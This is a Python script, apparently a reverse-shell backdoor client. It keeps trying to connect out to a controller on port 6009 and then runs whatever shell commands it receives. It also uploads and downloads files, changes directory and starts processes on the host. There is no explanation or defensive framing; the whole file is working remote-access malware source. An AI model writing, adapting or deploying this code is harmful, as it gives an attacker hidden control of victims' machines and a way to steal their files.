import socket
import json
import subprocess
import time
import os
import threading
import sys
from sys import platform
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()
def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':  # BEGIN
            pass
        elif command == 'help':  # ideally to be removed
            pass
        elif command == 'clear':
            pass  # END
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:5] == 'start':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send('[+] Started!')
            except:
                reliable_send('[-] Failed to start!')
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


def connection():
    while True:
        time.sleep(5)
        try:
            s.connect(('', 6009))
            shell()
            s.close()
            break
        except:
            connection()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
